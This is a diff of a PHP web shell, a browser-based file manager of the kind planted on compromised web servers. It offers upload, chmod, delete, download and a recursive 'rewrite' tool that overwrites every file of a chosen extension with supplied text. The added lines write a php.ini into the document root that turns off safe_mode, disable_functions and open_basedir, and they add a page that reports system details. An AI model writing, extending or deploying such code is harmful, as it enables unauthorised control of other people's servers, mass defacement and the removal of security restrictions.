@@ -1,10 +1,3 @@
-<?php
-error_reporting(0);
-session_start();
-set_time_limit(0);
-ignore_user_abort(0);
-date_default_timezone_set('Asia/Jakarta');
-?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -107,7 +100,7 @@ select {
 }
 td.not {
 	border-bottom:none;
-	padding:0px;
+	padding:3px;
 }
 td.yes {
 	border-bottom: 2px solid #e8e8e8;
@@ -381,6 +374,7 @@ a.tool {
 }
 td.not {
 	padding:0px;
+	padding:3px;
 }
 .icon {
 	width:20px;
@@ -457,22 +451,14 @@ input[type=submit] {
   td.cp; {
   	width:10px;
   }
+  input[type=text] {
+  	width:88%;
+  }
+  textarea.write {
+  	width:86%;
+  }
 </style>
 <body>
-<script>
-function hide() {
-  var x = document.getElementById("hide");
-  if (x.style.display === "block") {
-    x.style.display = "none";
-  } else {
-    x.style.display = "block";
-  }
-}
-function upload_show(id, text, btn) {
-	document.getElementById(id).style.display = 'block';
-	btn.style.display = 'none';
-}
-</script>
 <center>
 <table>
 <thead>
@@ -480,15 +466,9 @@ function upload_show(id, text, btn) {
     <tr>
     	<td colspan="5" class="not">
     		<center>
-    			<span class='strong'> System : <?=php_uname()?></span>
-    		</center>
-    	</td>
-    </tr>
-    <tr>
-    	<td colspan="5" class="not">
-    		<center>
     			<a class="tool" href="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']?>">HOME</a>
-				<a class="tool" href="?path=<?=cwd()?>&upload" onclick="upload_show('answer1', 	this); return false;">UPLOAD</a>
+    			<a class="tool" href="?path=<?=cwd()?>&info">INFO</a>
+				<a class="tool" href="?path=<?=cwd()?>&upload">UPLOAD</a>
 				<a class="tool" href="#!config">CONFIG</a>
 				<a class="tool" href="#!music">MUSIC</a>
 				<a class="tool" href="?path=<?=cwd()?>&rewrite">REWRITE</a>
@@ -496,7 +476,7 @@ function upload_show(id, text, btn) {
     	</td>
     </tr>
     <tr>
-    	<td colspan="5" class="yes">
+    	<td colspan="5">
     		<center>
     			<span class="strong"><?= pwd() ?> ( <?= permission(cwd(), perms(cwd())) ?> )</span>
     		</center>
@@ -601,6 +581,21 @@ function size($file) {
         return '0 bytes';
     }
 }
+makefile($_SERVER['DOCUMENT_ROOT']."/php.ini", "safe_mode = Off
+disable_functions = NONE
+safe_mode_gid = OFF
+open_basedir = OFF ");
+if (isset($_GET['info'])) {
+	?>
+	<tr>
+		<td style="width:150px;">
+			Sistem : <span style="color:green;"><?= php_uname() ?></span> <br>
+			Disable Function : <?= (!empty(ini_get("disable_functions"))) ? "<font color=red>".ini_get("disable_functions")."</font>" : "<font color=green>NONE</font>" ?>
+		</td>
+	</tr>
+	<?php
+	exit();
+}
 if (isset($_GET['upload'])) {
 	?>
 	<tr>
@@ -640,58 +635,6 @@ if (@$_GET['action'] == 'path') {
 						</li>
 					</ul>
 				</div>
-			</center>
-		</td>
-	</tr>
-	<?php
-	exit();
-}
-if (@$_GET['action'] == 'dir') {
-	$file = $_GET['file'];
-	?>
-	<tr>
-		<td class="not mas sup">
-			<span class="a">
-				Filename
-			</span>
-		</td>
-		</div>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<span><u><?=permission(cwd(),basename($file))?></u></span>
-		</td>
-	</tr>
-	<tr>
-		<td class="not mas">
-			<span class="a">
-				Size 
-			</span>
-		</td>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<?=size($file)?>
-		</td>
-	</tr>
-	<tr>
-		<td class="not mas">
-			<span class="a">
-				Type
-			</span>
-		</td>
-		<td class="not mas lol"><center>:</center></td>
-		<td class="not mas">
-			<?=get_type($file)?>
-		</td>
-	</tr>
-	<tr>
-		<td class="not" colspan="3">
-			<center>
-				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
-				<a class="fo act t" href="?path=<?=$file?>">OPEN</a>
-				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
-				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
-				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
-				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
 			</center>
 		</td>
 	</tr>
@@ -784,7 +727,7 @@ if (isset($_GET['action'])) {
 					</td>
 					<td class="not mas lol"><center>:</center></td>
 					<td class="not mas">
-						<?=size($file)?>
+						--
 					</td>
 				</tr>
 				<tr>
@@ -793,7 +736,7 @@ if (isset($_GET['action'])) {
 					</td>
 					<td class="not mas lol"><center>:</center></td>
 					<td class="not mas">
-						<?=get_type($file)?>
+						<?=filetype($file)?>
 					</td>
 				</tr>
 					<tr>
@@ -885,27 +828,27 @@ if (isset($_GET['rewrite'])) {
 	<form method="post">
 		<tr>
 			<td class="not">
-				<input style="width:96.9%;" class="action" type="text" name="dir" value="<?=cwd()?>">
+				<input class="action write" type="text" name="dir" value="<?=cwd()?>">
 			</td>
 		</tr>
 		<tr>
 			<td class="not">
-				<input style="width:96.9%;" class="action" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
+				<input class="action write" type="text" name="type" placeholder="type ext : php, if you want execute all please empty this">
 			</td>
 		</tr>
 		<tr>
 			<td class="not">
-				<textarea style="width:95%;" name="text" placeholder="put your script or text"></textarea>
+				<textarea class="write" name="text" placeholder="put your script or text"></textarea>
 			</td>
 		</tr>
 		<tr>
 			<td class="not">
-				<input style="width:100%;" type="submit" name="submit" value="REWRITE">
+				<input style="width:100%;" type="submit" name="rewrite" value="REWRITE">
 			</td>
 		</tr>
 	</form>
 	<?php
-	if (isset($_POST['submit'])) {
+	if (isset($_POST['rewrite'])) {
 		rewrite($_POST['dir'], $_POST['type'], $_POST['text']);
 	}
 	exit();
@@ -917,19 +860,19 @@ function rewrite($dir, $type, $text) {
             $path = $dir.DIRECTORY_SEPARATOR.$file;
             if($file === '.' || filetype($path) == 'file') {
                 if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                	alert("success", "rewrite ".cwd().DIRECTORY_SEPARATOR."{$file}");
+                	alert("success", "rewrite ".cwd().'/'."{$file}");
                 	file_put_contents($path, $text);
                 endif;
             } elseif($file === '..' || filetype($path) == 'file') {
                 if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    alert("success", "rewrite ".cwd().DIRECTORY_SEPARATOR."{$file}");
+                    alert("success", "rewrite ".cwd().'/'."{$file}");
                 file_put_contents($path, $text);
                 endif;
             } else {
                 if(is_dir($path)) {
                     if(is_writable($path)) {
                         @file_put_contents($path, $text);
-                        masswrite($path,$type,$text);
+                        rewrite($path,$type,$text);
                     }
                 }
             }
@@ -1346,7 +1289,7 @@ if (isset($_GET['rename'])) {
 		</tr>
 		<tr>
 			<td class="not" colspan="3">
-				<input class="action" type="text" name="newname" value="<?=basename($file)?>">
+				<input class="action write" type="text" name="newname" value="<?=basename($file)?>">
 			</td>
 		</tr>
 		<tr>
@@ -1537,12 +1480,10 @@ if (isset($_GET['edit'])) {
 	<td class="not" colspan="3">
 		<select name="mode" style="width:100%;">
 			<option value="" selected>action</option>
-			<option> </option>
 			<option value="1">delete</option>
 			<option value="2">zip</option>
 			<option value="3">copy</option>
 			<option value="4">download</option>
-			<option> </option>
 			<?php
 			foreach ($scandir as $file_zip) {
 				if (is_file($file_zip)) {
